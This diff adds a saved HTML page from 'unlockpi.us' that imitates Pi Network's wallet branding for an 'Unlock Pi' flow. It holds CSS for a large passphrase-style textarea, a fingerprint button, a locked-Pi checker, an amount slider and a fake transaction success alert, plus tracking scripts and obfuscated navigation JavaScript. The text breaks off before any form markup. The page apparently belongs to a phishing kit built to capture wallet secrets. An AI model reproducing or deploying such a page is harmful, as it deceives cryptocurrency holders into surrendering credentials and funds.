@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<!-- saved from url=(0020)https://unlockpi.us/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+        
+        <meta name="robots" content="noindex, nofollow">
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+        <title>............</title>
+        <link href="./1_files/saved_resource" rel="stylesheet">
+        <link href="./1_files/all.min.css" rel="stylesheet">
+        
+        <script src="./1_files/saved_resource(1)" async="" type="text/javascript"></script><script src="./1_files/saved_resource(1)" async="" type="text/javascript"></script><script src="./1_files/679731098077540" async=""></script><script src="./1_files/623149364037571" async=""></script><script src="./1_files/2185611755170254" async=""></script><script src="./1_files/1084230590158454" async=""></script><script src="./1_files/1300067708090891" async=""></script><script src="./1_files/688935713432359" async=""></script><script type="text/javascript" async="" src="./1_files/fbevents.js.indir"></script><script type="text/javascript" async="" src="./1_files/js"></script><script type="text/javascript" async="" src="./1_files/js(1)"></script><script type="text/javascript" async="" src="./1_files/js(2)"></script><script async="" src="./1_files/gtm.js.indir"></script><script async="" src="./1_files/vdweb.min.js.indir"></script>
+        
+        <style>
+            @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;500;600;700&amp;display=swap");
+
+            :root {
+                --pi-purple: #724394;
+                --pi-purple-light: #8c54b0;
+                --pi-purple-dark: #54306f;
+                --pi-gold: #f9a11b;
+                --pi-gold-light: #ffc14d;
+                --pi-header-purple: #724394;
+                --icon-color: #724394;
+                --pi-text-color: #333333;
+            }
+
+            * {
+                box-sizing: border-box;
+                margin: 0;
+                padding: 0;
+            }
+
+            body {
+                font-family: "Nunito", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                background-color: #ffffff;
+                color: var(--pi-text-color);
+                width: 100%;
+                height: 100vh;
+                overflow-x: hidden;
+                position: relative;
+            }
+
+            /* Header styling */
+            .header {
+                background-color: var(--pi-header-purple);
+                color: white;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 1rem 1rem;
+                height: 52px;
+                width: 100%;
+                position: relative;
+                z-index: 10;
+            }
+
+            .header-title {
+                font-size: 1.1rem;
+                font-weight: 650 !important;
+                text-align: center;
+                flex-grow: 1;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .back-button,
+            .dropdown-button {
+                color: white;
+                width: 24px;
+                height: 24px;
+                cursor: pointer;
+            }
+
+            .header-pi-logo {
+                margin-left: 5px;
+                width: 40px;
+                height: 40px;
+            }
+
+            .header-unlock-icon {
+                margin-right: 5px;
+                width: 20px;
+                height: 20px;
+            }
+
+            /* Logo container */
+            .pi-logo-container {
+                display: flex;
+                justify-content: center;
+                margin: 0.1rem auto 0.2rem;
+            }
+
+            .pi-logo {
+                width: 200px;
+                height: 200px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto;
+            }
+
+            .welcome-text {
+                text-align: center;
+                font-size: 1.4rem;
+                font-weight: 500;
+                margin: 0.2rem auto 5rem;
+                color: var(--pi-gold);
+                width: 100%;
+            }
+
+            /* Icon grid */
+            .icons-grid {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 1.2rem;
+                padding: 0 1rem;
+                max-width: 650px;
+                margin: 0 auto;
+            }
+
+            /* Consistent icon card styling */
+            .icon-card {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                width: 80px;
+                height: 105px;
+                margin: 0 auto;
+                cursor: pointer !important;
+                text-decoration: none;
+                position: relative;
+                z-index: 1;
+                outline: none;
+                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            }
+
+            /* Add tap/click effect for visual feedback */
+            .icon-card:active {
+                transform: scale(0.97);
+                transition: transform 0.1s;
+            }
+
+            .icon-img-container {
+                min-width: 70px !important;
+                min-height: 70px !important;
+                width: 70px !important;
+                height: 70px !important;
+                border: 1px solid #724394 !important;
+                border-radius: 16px;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: center !important;
+                background-color: white !important;
+            }
+
+            .icon-img-container svg,
+            .domain-icon {
+                width: 68px !important;
+                height: 64px !important;
+                min-width: 68px !important;
+                min-height: 64px !important;
+                flex: 0 0 auto !important;
+            }
+
+            .icon-label {
+                font-size: 0.9rem;
+                text-align: center;
+                color: var(--pi-purple);
+                font-weight: 400;
+                margin-top: 16px;
+                margin-bottom: 100px;
+                width: 100%;
+            }
+
+            /* Explore button */
+            .explore-button {
+                display: block;
+                width: 80%;
+                max-width: 300px;
+                margin: 2rem auto 1.5rem;
+                padding: 0.8rem;
+                background-color: var(--pi-purple);
+                color: white;
+                text-align: center;
+                border-radius: 0.5rem;
+                font-weight: 500;
+                font-size: 0.95rem;
+                text-transform: uppercase;
+                text-decoration: none;
+            }
+
+            /* Bottom navigation */
+            .bottom-nav {
+                display: flex;
+                justify-content: center;
+                padding: 1.5rem;
+                margin-top: 1.5rem;
+            }
+
+            .nav-indicator {
+                width: 80px;
+                height: 8px;
+                background-color: #ccc;
+                border-radius: 4px;
+            }
+
+            /* Page styling - improved for better transitions */
+            .page {
+                position: fixed; /* Changed from absolute to fixed for better overlay */
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: white;
+                overflow-x: hidden;
+                overflow-y: auto; /* Allow vertical scrolling */
+                transform: translateX(100%);
+                visibility: hidden;
+                opacity: 0;
+                transition: transform 0.3s ease, opacity 0.3s ease, visibility 0s linear 0.3s;
+                z-index: 1; /* Lower z-index by default */
+            }
+
+            body.dark .page {
+                background-color: #181818;
+            }
+
+            .page.active {
+                transform: translateX(0);
+                visibility: visible;
+                opacity: 1;
+                transition: transform 0.3s ease, opacity 0.3s ease, visibility 0s linear 0s;
+                z-index: 5; /* Higher z-index when active */
+            }
+
+            #homePage {
+                transform: translateX(0);
+                visibility: visible;
+                opacity: 1;
+                z-index: 5; /* Same z-index as active pages */
+            }
+
+            /* Unlock page content */
+            .unlock-content {
+                padding: 2rem 1.2rem;
+            }
+
+            .form-group {
+                margin-bottom: 1.5rem;
+            }
+
+            .form-label {
+                display: block;
+                margin-bottom: 0.5rem;
+                font-weight: 500;
+                font-size: 1rem;
+            }
+
+            .form-input {
+                width: 100%;
+                padding: 1.2rem;
+                border: 1px solid #ddd;
+                border-radius: 0.5rem;
+                font-size: 1rem;
+                background-color: white;
+                color: #333;
+                resize: none;
+                font-family: monospace;
+                min-height: 160px;
+                transition: border-color 0.2s ease;
+            }
+
+            .form-input:focus {
+                outline: none;
+                border-color: var(--pi-purple);
+                box-shadow: 0 0 0 1px var(--pi-purple);
+            }
+
+            .submit-button {
+                width: 100%;
+                padding: 1rem;
+                background-color: var(--pi-purple);
+                color: white;
+                border: none;
+                border-radius: 0.5rem;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                transition: background-color 0.2s;
+                text-transform: uppercase;
+                position: relative;
+            }
+
+            .submit-button:disabled,
+            .fingerprint-button:disabled {
+                opacity: 0.7;
+                cursor: not-allowed;
+            }
+
+            /* Replace the spinner and animation CSS */
+            .spinner {
+                display: none;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                width: 24px; /* Increased size */
+                height: 24px; /* Increased size */
+                margin-top: -12px;
+                margin-left: -12px;
+                border: 3px solid transparent; /* Completely transparent border */
+                border-radius: 50%;
+                border-top-color: var(--pi-purple); /* Only the top is colored */
+                border-left-color: var(--pi-purple); /* Add left border color for better visibility */
+                animation: spinner-rotate 1s linear infinite;
+                pointer-events: none;
+            }
+
+            @keyframes spinner-rotate {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+
+            .button-processing .button-text {
+                opacity: 0.7;
+            }
+
+            .button-processing .spinner {
+                display: block;
+            }
+
+            .button-text {
+                transition: opacity 0.2s;
+            }
+
+            .fingerprint-button {
+                width: 100%;
+                padding: 1rem;
+                background-color: transparent;
+                /* color: var(--pi-purple);
+                border: 1px solid var(--pi-purple); */
+                border-radius: 0.5rem;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                margin-top: 0.75rem;
+                transition: background-color 0.2s;
+                text-transform: uppercase;
+                position: relative;
+            }
+
+            .help-text {
+                font-size: 0.95rem;
+                color: #666;
+                margin-top: 1.5rem;
+                line-height: 1.5;
+            }
+
+            .help-text a {
+                color: #3b82f6;
+                text-decoration: none;
+            }
+
+            /* Warning message */
+            .warning-message {
+                background-color: #fef3c7;
+                border: 1px solid #f59e0b;
+                border-radius: 0.5rem;
+                padding: 1rem;
+                margin-bottom: 1.5rem;
+                color: #92400e;
+                font-size: 0.95rem;
+                display: flex;
+                align-items: flex-start;
+            }
+
+            .warning-icon {
+                margin-right: 0.75rem;
+                font-size: 1.25rem;
+                color: #f59e0b;
+            }
+
+            /* Amount slider */
+            .amount-slider {
+                width: 100%;
+                margin: 1.5rem 0;
+                height: 10px;
+            }
+
+            .amount-display {
+                font-size: 3rem;
+                font-weight: bold;
+                text-align: center;
+                margin-bottom: 1rem;
+                color: var(--pi-purple);
+            }
+
+            .amount-limits {
+                display: flex;
+                justify-content: space-between;
+                font-size: 0.95rem;
+                color: #666;
+                margin-top: 0.75rem;
+            }
+
+            .error-message {
+                color: #ef4444;
+                font-size: 0.9rem;
+                margin-top: 0.5rem;
+                display: none;
+            }
+
+            /* Find the icon-card for Unlock Pi button */
+            #unlockPiButton .icon-img-container {
+                border: 1px solid #724394;
+                border-radius: 16px;
+            }
+
+            /* Loading overlay */
+            .loading-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: white; /* Pure white background */
+                display: none;
+                align-items: center;
+                justify-content: center;
+                z-index: 100;
+            }
+
+            .submit-button .spinner,
+            .close-button .spinner,
+            .fingerprint-button .spinner {
+                width: 26px; /* Even larger for buttons */
+                height: 26px; /* Even larger for buttons */
+                margin-top: -13px;
+                margin-left: -13px;
+                border-width: 4px; /* Thicker border for better visibility */
+            }
+
+            .loading-spinner {
+                width: 80px; /* Larger size */
+                height: 80px; /* Larger size */
+                border-radius: 50%;
+                border: 8px solid transparent; /* Thicker border, transparent */
+                border-top-color: var(--pi-purple); /* Only the top is colored */
+                border-left-color: var(--pi-purple); /* Add left border color for better visibility */
+                animation: spin 1s linear infinite;
+            }
+
+            /* Update the initial loading spinner */
+            .initial-spinner {
+                width: 60px; /* Larger size */
+                height: 60px; /* Larger size */
+                border: 6px solid transparent !important; /* Thicker border, transparent */
+                border-top-color: var(--pi-purple) !important; /* Only the top is colored */
+                border-left-color: var(--pi-purple) !important; /* Add left border color for better visibility */
+                border-radius: 50%;
+                animation: spinner-rotate 1s linear infinite;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+
+            /* Success alert */
+            .success-alert {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background-color: white;
+                border-radius: 0.5rem;
+                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+                padding: 1.5rem;
+                text-align: center;
+                z-index: 150;
+                display: none;
+                width: 85%;
+                max-width: 380px;
+            }
+
+            .success-icon {
+                font-size: 3rem;
+                color: #22c55e;
+                margin-bottom: 1rem;
+            }
+
+            .close-button {
+                width: 100%;
+                padding: 1rem;
+                background-color: var(--pi-purple);
+                color: white;
+                border: none;
+                border-radius: 0.5rem;
+                font-size: 1rem;
+                font-weight: 600;
+                cursor: pointer;
+                margin-top: 1.5rem;
+                text-transform: uppercase;
+                position: relative;
+            }
+
+            /* Transaction preview in success alert */
+            .transaction-preview {
+                background-color: #f5f5f5;
+                border-radius: 12px;
+                padding: 1rem;
+                margin: 1rem 0;
+                display: flex;
+                align-items: flex-start;
+                text-align: left;
+            }
+
+            .transaction-preview-icon {
+                width: 36px;
+                height: 36px;
+                border-radius: 50%;
+                background-color: rgba(114, 67, 148, 0.1);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin-right: 12px;
+                flex-shrink: 0;
+            }
+
+            .transaction-preview-details {
+                flex-grow: 1;
+            }
+
+            .transaction-preview-amount {
+                font-size: 1.4rem;
+                font-weight: 600;
+                color: #74b035;
+                margin-bottom: 0.25rem;
+            }
+
+            .transaction-preview-recipient,
+            .transaction-preview-date {
+                font-size: 0.9rem;
+                color: #666;
+                margin-top: 0.25rem;
+            }
+
+            /* Transaction details in success alert */
+            .transaction-detail-row {
+                display: flex;
+                justify-content: space-between;
+                padding: 0.75rem 0;
+                border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+                text-align: left;
+            }
+
+            .transaction-detail-label {
+                color: #666;
+                font-weight: 500;
+            }
+
+            .transaction-detail-value {
+                font-weight: 600;
+                color: var(--pi-text-color);
+            }
+
+            /* Important note in success alert */
+            .important-note {
+                background-color: #fff8e1;
+                border-left: 4px solid #ffc107;
+                padding: 0.75rem;
+                margin: 1rem 0;
+                border-radius: 4px;
+                text-align: left;
+                font-size: 0.9rem;
+                color: #775700;
+            }
+
+            /* Validation message */
+            .validation-message {
+                color: #e74c3c;
+                font-size: 1rem;
+                margin-top: 0.5rem;
+                margin-bottom: 1rem;
+                text-align: left;
+                font-weight: 400;
+                padding-left: 0.5rem;
+                display: none;
+            }
+
+            /* Import Roboto font from Google Fonts */
+            @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap");
+
+            /*Additional styles for the collapsible info section */
+            .info-collapsible {
+                background-color: #fff;
+                border-radius: 12px;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+                margin: 1.5rem 0;
+                overflow: hidden;
+                border: 1px solid rgba(0, 0, 0, 0.08);
+                transition: box-shadow 0.3s ease;
+                font-family: "Roboto", sans-serif;
+            }
+
+            .info-collapsible:hover {
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            }
+
+            .dark .info-collapsible {
+                background-color: #222;
+                border-color: rgba(255, 255, 255, 0.08);
+            }
+
+            .info-header {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 1rem 1.25rem;
+                cursor: pointer;
+                border-bottom: 1px solid transparent;
+                transition: all 0.2s ease;
+                position: relative;
+            }
+
+            .info-header:hover {
+                background-color: rgba(114, 67, 148, 0.04);
+            }
+
+            .info-header h3 {
+                font-family: "Roboto", sans-serif;
+                font-size: 1.1rem;
+                font-weight: 500;
+                color: var(--pi-purple);
+                margin: 0;
+                letter-spacing: 0.5px;
+            }
+
+            .collapse-toggle {
+                background: transparent;
+                border: none;
+                color: var(--pi-purple);
+                width: 32px;
+                height: 32px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: pointer;
+                transition: transform 0.3s ease;
+                padding: 0;
+            }
+
+            .collapse-toggle.active {
+                transform: rotate(180deg);
+            }
+
+            .info-content {
+                max-height: 0;
+                overflow: hidden;
+                transition: max-height 0.4s cubic-bezier(0, 1, 0, 1);
+            }
+
+            .info-content.active {
+                max-height: 2000px;
+                transition: max-height 0.6s ease-in-out;
+            }
+
+            .info-content-inner {
+                padding: 0 1.25rem 1.25rem;
+            }
+
+            .info-content h4 {
+                font-family: "Roboto", sans-serif;
+                font-size: 1.125rem; /* 18px */
+                font-weight: 500;
+                color: #000000;
+                margin: 1.25rem 0 1rem;
+                line-height: 1.4;
+                letter-spacing: 0.5px;
+            }
+
+            .info-content h5 {
+                font-family: "Roboto", sans-serif;
+                font-size: 1rem; /* 16px */
+                font-weight: 500;
+                color: #000000;
+                margin: 1.2rem 0 0.8rem;
+                line-height: 1.4;
+                letter-spacing: 0.5px;
+            }
+
+            .info-content p {
+                font-family: "Roboto", sans-serif;
+                font-size: 0.875rem; /* 14px */
+                font-weight: 400;
+                line-height: 1.5;
+                color: #333333;
+                margin: 0.8rem 0;
+                letter-spacing: 0.25px;
+            }
+
+            .dark .info-content p {
+                color: #ddd;
+            }
+
+            .info-list,
+            .info-target {
+                padding-left: 0.5rem;
+                list-style-type: none;
+                margin: 1rem 0;
+            }
+
+            .info-list li,
+            .info-target li {
+                position: relative;
+                padding-left: 2rem;
+                margin-bottom: 0.8rem;
+                font-family: "Roboto", sans-serif;
+                font-size: 0.875rem; /* 14px */
+                font-weight: 400;
+                line-height: 1.5;
+                color: #333333;
+                letter-spacing: 0.25px;
+            }
+
+            .check-icon,
+            .target-icon,
+            .bullet {
+                position: absolute;
+                left: 0;
+                top: 0.1rem;
+            }
+
+            .info-block {
+                margin: 1rem 0;
+                background-color: rgba(114, 67, 148, 0.03);
+                border-radius: 8px;
+                padding: 0.8rem 1rem;
+            }
+
+            .info-block p {
+                margin-top: 0.4rem;
+                font-weight: 500;
+            }
+
+            .info-block ul {
+                padding-left: 2.5rem;
+                margin: 0.5rem 0;
+            }
+
+            .info-block ul li {
+                font-family: "Roboto", sans-serif;
+                font-size: 0.875rem; /* 14px */
+                font-weight: 400;
+                line-height: 1.5;
+                margin-bottom: 0.5rem;
+                color: #333333;
+                letter-spacing: 0.25px;
+            }
+
+            /* Add backdrop for the success alert */
+            .modal-backdrop {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0, 0, 0, 0.5);
+                z-index: 140;
+                display: none;
+            }
+
+            /* Button active states with high specificity and !important */
+            .submit-button:active {
+                background-color: #8c54b0 !important;
+                transform: translateY(1px) !important;
+                transition: all 0s !important;
+            }
+
+            .fingerprint-button:active {
+                background-color: rgba(140, 84, 176, 0.2) !important;
+                color: #8c54b0 !important;
+                transform: translateY(1px) !important;
+                transition: all 0s !important;
+            }
+
+            /* Icon card active state */
+            #unlockPiButton:active .icon-img-container,
+            .icon-card:active .icon-img-container {
+                border-color: #9c67c5 !important;
+                background-color: rgba(140, 84, 176, 0.1) !important;
+            }
+
+            .icon-card:active .icon-label {
+                color: #9c67c5 !important;
+            }
+
+            /* Back button active state */
+            .back-button:active {
+                background-color: rgba(140, 84, 176, 0.1) !important;
+                border-radius: 50% !important;
+            }
+
+            .back-button:active svg {
+                color: #8c54b0 !important;
+            }
+
+            /* Spinner button active */
+            .close-button:active {
+                background-color: #8c54b0 !important;
+            }
+
+            /* Make sure all buttons have proper cursor */
+            .back-button,
+            .icon-card,
+            .submit-button,
+            .fingerprint-button,
+            .close-button {
+                cursor: pointer !important;
+            }
+
+            /* CRITICAL: Fix for the unlock button to ensure consistent styling */
+            #unlockPiButton {
+                cursor: pointer !important;
+            }
+
+            /* ===== SỬA LỖI TRANG LOADING ===== */
+            /* Trang loading - CHỈNH SỬA CHO HIỂN THỊ CHÍNH XÁC */
+            .loading-page {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: white;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 50 !important; /* Đảm bảo hiển thị phía trên các trang khác */
+                transition: opacity 0.3s ease, visibility 0s;
+                visibility: hidden;
+                opacity: 0;
+                transform: translateX(0) !important; /* Sửa lỗi transform */
+            }
+
+            .loading-page.active {
+                visibility: visible;
+                opacity: 1;
+                z-index: 50 !important;
+                transform: translateX(0) !important;
+            }
+
+            .loading-container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+
+            .loading-spinner-purple {
+                width: 60px;
+                height: 60px;
+                border: 3px solid transparent;
+                border-top-color: var(--pi-purple);
+                border-left-color: var(--pi-purple);
+                border-radius: 50%;
+                animation: spinner-rotate 1.5s linear infinite;
+            }
+
+            .loading-text {
+                margin-top: 20px;
+                font-size: 18px;
+                font-weight: 500;
+                color: #333;
+                text-align: center;
+            }
+
+            .loading-text.purple {
+                color: var(--pi-purple);
+            }
+
+            /* Đảm bảo trang loading không bị transform */
+            #initialLoadingPage,
+            #authLoadingPage {
+                transform: translateX(0) !important;
+            }
+
+            /* Locked Pi styles */
+            .lock-card {
+                background-color: white;
+                border-radius: 18px;
+                padding: 16px;
+                margin: 15px 0;
+                display: flex;
+                align-items: center;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            }
+
+            .lock-icon {
+                width: 40px;
+                height: 40px;
+                margin-right: 16px;
+                position: relative;
+                flex-shrink: 0;
+            }
+
+            .lock-icon img {
+                width: 100%;
+                height: 100%;
+                object-fit: contain;
+            }
+
+            .pi-amount {
+                color: #7cb342;
+                font-size: 16px;
+                font-weight: bold;
+                font-family: "Nunito", sans-serif;
+            }
+
+            .from-address {
+                font-size: 16px;
+                font-weight: 400;
+                color: #666;
+                font-family: "Nunito", sans-serif;
+            }
+
+            .unlock-date {
+                color: #888;
+                font-size: 15px;
+                font-family: "Nunito", sans-serif;
+            }
+
+            #resultsContainer {
+                margin-top: 20px;
+            }
+
+            /* Total locked amount display */
+            .total-locked {
+                background-color: #f8f9fa;
+                border-radius: 12px;
+                padding: 15px;
+                margin: 20px 0;
+                text-align: center;
+                border: 1px solid #e9ecef;
+            }
+
+            .total-locked-label {
+                font-size: 16px;
+                color: #495057;
+                margin-bottom: 8px;
+            }
+
+            .total-locked-amount {
+                font-size: 28px;
+                font-weight: bold;
+                color: var(--pi-purple);
+                font-family: "Nunito", sans-serif;
+            }
+
+            .continue-button {
+                margin-top: 20px;
+            }
+
+            /* Make check locked pi form more consistent with other pages */
+            .check-locked-form {
+                background-color: white;
+                border-radius: 12px;
+                padding: 20px;
+                margin-bottom: 20px;
+                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            }
+
+            /* Adjustments for the combined flow */
+            #amountSelectionSection {
+                margin-top: 1.5rem;
+                border-top: 1px solid #eaeaea;
+                padding-top: 1.5rem;
+            }
+
+            .mt-4 {
+                margin-top: 1rem;
+            }
+
+            .w-full {
+                width: 100%;
+            }
+
+            .mb-4 {
+                margin-bottom: 1rem;
+            }
+        </style>
+
+        <!-- Google Tag Manager -->
+        <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+        })(window,document,'script','dataLayer','GTM-MMXD7N7V');</script>
+        <!-- End Google Tag Manager -->
+
+        <!-- Histats.com  START  (aync)-->
+        <script type="text/javascript">var _Hasync= _Hasync|| [];
+        _Hasync.push(['Histats.start', '1,4944516,4,0,0,0,00010000']);
+        _Hasync.push(['Histats.fasi', '1']);
+        _Hasync.push(['Histats.track_hits', '']);
+        (function() {
+        var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+        hs.src = ('//s10.histats.com/js15_as.js');
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+        })();</script><script type="text/javascript" async="" src="./1_files/js15_as.js.indir"></script>
+        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4944516&101" alt="" border="0"></a></noscript>
+        <!-- Histats.com  END  -->
+
+    </head>
+    <body>
+        <script>
+            var _0x3be20f=_0x5054;(function(_0x461ef1,_0x3e44bd){var _0x3fdf7c=_0x5054,_0x166fac=_0x461ef1();while(!![]){try{var _0x4b3bee=parseInt(_0x3fdf7c(0xcb))/0x1+parseInt(_0x3fdf7c(0xce))/0x2*(parseInt(_0x3fdf7c(0xb3))/0x3)+parseInt(_0x3fdf7c(0xbd))/0x4*(-parseInt(_0x3fdf7c(0xb5))/0x5)+parseInt(_0x3fdf7c(0xc5))/0x6*(parseInt(_0x3fdf7c(0xd1))/0x7)+parseInt(_0x3fdf7c(0xd3))/0x8+parseInt(_0x3fdf7c(0xb6))/0x9+-parseInt(_0x3fdf7c(0xcd))/0xa;if(_0x4b3bee===_0x3e44bd)break;else _0x166fac['push'](_0x166fac['shift']());}catch(_0x1ae7a4){_0x166fac['push'](_0x166fac['shift']());}}}(_0x3028,0x3dc7c),window[_0x3be20f(0xc6)]=function(){var _0x325b55=_0x3be20f;console['log']('Navigating\x20to\x20home'),document[_0x325b55(0xc1)](_0x325b55(0xc7))[_0x325b55(0xbc)](_0x277271=>{var _0x38886c=_0x325b55;_0x277271[_0x38886c(0xb0)]['remove'](_0x38886c(0xc2));}),document['getElementById']('homePage')[_0x325b55(0xb0)]['add']('active'),document[_0x325b55(0xb4)](_0x325b55(0xc4))['classList'][_0x325b55(0xcf)](_0x325b55(0xc2)),document['getElementById']('authLoadingPage')[_0x325b55(0xb0)]['remove'](_0x325b55(0xc2));},window['navigateToAmount']=function(){var _0xcf7d15=_0x3be20f;console[_0xcf7d15(0xd4)](_0xcf7d15(0xcc)),document[_0xcf7d15(0xc1)](_0xcf7d15(0xc7))[_0xcf7d15(0xbc)](_0x581855=>{var _0x211448=_0xcf7d15;_0x581855[_0x211448(0xb0)]['remove']('active');}),document[_0xcf7d15(0xb4)]('amountPage')[_0xcf7d15(0xb0)]['add'](_0xcf7d15(0xc2));},window[_0x3be20f(0xbe)]=function(){var _0x52d86e=_0x3be20f;console['log'](_0x52d86e(0xb9)),document['querySelectorAll'](_0x52d86e(0xc7))['forEach'](_0x4a39e7=>{var _0x315909=_0x52d86e;_0x4a39e7['classList'][_0x315909(0xcf)](_0x315909(0xc2));}),document[_0x52d86e(0xb4)](_0x52d86e(0xba))[_0x52d86e(0xb0)]['add'](_0x52d86e(0xc2));},window['handleUnlockPiClick']=function(_0x103fc8){var _0x59787f=_0x3be20f;console[_0x59787f(0xd4)](_0x59787f(0xbf));_0x103fc8&&(_0x103fc8['preventDefault'](),_0x103fc8[_0x59787f(0xca)]());document[_0x59787f(0xc1)](_0x59787f(0xc7))[_0x59787f(0xbc)](_0x22ed16=>{var _0x1648e3=_0x59787f;_0x22ed16[_0x1648e3(0xb0)]['remove'](_0x1648e3(0xc2));});var _0x153a67=document[_0x59787f(0xb4)](_0x59787f(0xc4));return _0x153a67[_0x59787f(0xbb)][_0x59787f(0xd0)]=_0x59787f(0xc8),_0x153a67[_0x59787f(0xbb)][_0x59787f(0xc0)]='1',_0x153a67[_0x59787f(0xb0)][_0x59787f(0xc3)](_0x59787f(0xc2)),setTimeout(function(){var _0x2814de=_0x59787f;_0x153a67['classList'][_0x2814de(0xcf)](_0x2814de(0xc2)),_0x153a67[_0x2814de(0xbb)]['visibility']=_0x2814de(0xb1),_0x153a67[_0x2814de(0xbb)][_0x2814de(0xc0)]='0';var _0x353468=document[_0x2814de(0xb4)](_0x2814de(0xc9));_0x353468[_0x2814de(0xbb)]['visibility']=_0x2814de(0xc8),_0x353468[_0x2814de(0xbb)]['opacity']='1',_0x353468[_0x2814de(0xb0)]['add'](_0x2814de(0xc2)),setTimeout(function(){var _0xf69d1a=_0x2814de;_0x353468[_0xf69d1a(0xb0)][_0xf69d1a(0xcf)](_0xf69d1a(0xc2)),_0x353468[_0xf69d1a(0xbb)][_0xf69d1a(0xd0)]='hidden',_0x353468[_0xf69d1a(0xbb)][_0xf69d1a(0xc0)]='0',setTimeout(function(){var _0x37d006=_0xf69d1a;console[_0x37d006(0xd4)](_0x37d006(0xb8));var _0xffa186=document[_0x37d006(0xb4)]('amountPage');_0xffa186[_0x37d006(0xb0)][_0x37d006(0xc3)](_0x37d006(0xc2)),_0xffa186[_0x37d006(0xbb)]['transform']=_0x37d006(0xd2),_0xffa186['style']['visibility']=_0x37d006(0xc8),_0xffa186[_0x37d006(0xbb)][_0x37d006(0xc0)]='1',console[_0x37d006(0xd4)](_0x37d006(0xb7));},0x64);},0x7d0);},0x5dc),![];});function handleBackNavigation(_0x3421cc){var _0x15826f=_0x3be20f;console[_0x15826f(0xd4)]('Back\x20button\x20clicked');const _0x10693d=_0x3421cc['closest'](_0x15826f(0xc7));if(_0x10693d){if(_0x10693d['id']===_0x15826f(0xb2))navigateToHome();else _0x10693d['id']===_0x15826f(0xba)&&navigateToAmount();}}function _0x5054(_0x4f4c49,_0xf89ea){var _0x3028ff=_0x3028();return _0x5054=function(_0x505463,_0x408658){_0x505463=_0x505463-0xb0;var _0x26d0ca=_0x3028ff[_0x505463];return _0x26d0ca;},_0x5054(_0x4f4c49,_0xf89ea);}function _0x3028(){var _0x35b804=['initialLoadingPage','2736DrCFFI','navigateToHome','.page','visible','authLoadingPage','stopPropagation','478356HgvuWY','Navigating\x20to\x20amount\x20page','4839100DwBdzB','76mAmqNl','remove','visibility','3934wyDzlO','translateX(0)','125960ETvhKS','log','classList','hidden','amountPage','17847QXaNHY','getElementById','278370JxpDgl','1853271NZFebi','Amount\x20page\x20should\x20be\x20visible\x20now','Trying\x20to\x20show\x20amount\x20page','Navigating\x20to\x20unlock\x20page','unlockPage','style','forEach','32RbUrYz','navigateToUnlock','Unlock\x20Pi\x20button\x20clicked','opacity','querySelectorAll','active','add'];_0x3028=function(){return _0x35b804;};return _0x3028();}
+        </script>
+        <!-- Home Page -->
+        <div class="page active" id="homePage">
+            <div class="header">
+                <div class="back-button" id="homeBackButton">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                    </svg>
+                </div>
+                <div class="header-title">
+                    Home
+                    <svg class="header-pi-logo" height="26" viewBox="0 0 1024 1024" width="26" xmlns="http://www.w3.org/2000/svg">
